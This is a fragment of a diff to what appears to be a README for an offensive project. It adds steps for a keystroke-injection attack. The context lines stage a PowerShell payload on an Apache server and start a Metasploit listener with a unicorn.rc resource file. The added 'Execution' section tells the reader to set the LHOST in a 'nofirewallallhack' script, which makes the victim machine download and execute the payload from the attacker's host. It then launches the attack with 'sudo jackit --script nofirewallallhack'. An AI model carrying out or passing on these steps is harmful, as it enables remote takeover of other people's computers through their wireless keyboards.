@@ -37,3 +37,8 @@ mv powershell_attack.txt /var/www/html/
 service apache2 start
 msfconsole -r unicorn.rc
 ```
+## Execution
+In order to optimize the speed of the payload, I created a web server on my device that the script downloads and executes. It is not necessary; however, recommended. In order for the script to install the payload, edit the `<LHOST>` in my `nofirewallallhack` file. Once the webserver is up and running with the Powershell payload, execute the command 
+```
+sudo jackit --script nofirewallallhack
+```
